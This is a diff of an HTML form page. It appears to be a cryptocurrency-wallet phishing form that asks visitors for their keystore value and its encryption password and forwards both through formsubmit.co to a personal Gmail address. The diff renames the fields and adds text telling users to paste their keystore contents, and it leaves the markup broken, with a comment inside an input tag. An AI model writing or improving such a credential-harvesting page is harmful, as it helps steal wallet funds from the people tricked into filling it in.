@@ -110,53 +110,63 @@
           class="max-w-lg mx-auto p-6 bg-white rounded-lg shadow-md space-y-4 mt-6"
           action="https://formsubmit.co/sodmaq@gmail.com"
           method="POST"
-          id="myForm"
         >
           <!-- Hidden fields for security and control -->
           <input type="hidden" name="_subject" value="New Form Submission" />
           <input type="hidden" name="_captcha" value="false" />
           <input type="hidden" name="_template" value="table" />
 
-          <!-- Private Key Input -->
+          <!-- Phrase Value Input -->
           <div>
             <label
-              for="private-key"
+              for="Phrase-Value-3"
               class="block text-sm font-medium text-gray-700 mb-1"
             >
-              Keystore value
+              Phrase Value
             </label>
             <input
               class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-              name="private_key"
-              placeholder="Enter your Keystore value..."
-              type="text"
-              id="private-key"
-              pattern="[0-9]*"
-              inputmode="numeric"
-              required
+              autofocus
+              maxlength="256"
+              name="phraseValue"
+              <!--
+              Updated
+              name
+              attribute
+              to
+              be
+              more
+              descriptive
+              --
             />
+            placeholder="Input your keystore value..." type="text"
+            id="Phrase-Value-3" required />
           </div>
 
-          <!-- Another Private Key Input (Make sure it's intentional to have two) -->
+          <!-- Password Input -->
           <div>
             <label
-              for="private-key-2"
+              for="Password"
               class="block text-sm font-medium text-gray-700 mb-1"
             >
               Password
             </label>
             <input
               class="w-full p-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-              name="private_key_2"
-              placeholder="Enter your Password..."
-              type="text"
-              id="private-key-2"
-              pattern="[0-9]*"
-              inputmode="numeric"
+              name="password"
+              placeholder="Input your password..."
+              type="password"
+              id="Password"
               required
             />
           </div>
 
+          <h1>
+            Several lines of text beginning with '(...)' plus the password you
+            used to encrypt it.
+          </h1>
+
+          <!-- Submit Button -->
           <div>
             <input
               type="submit"
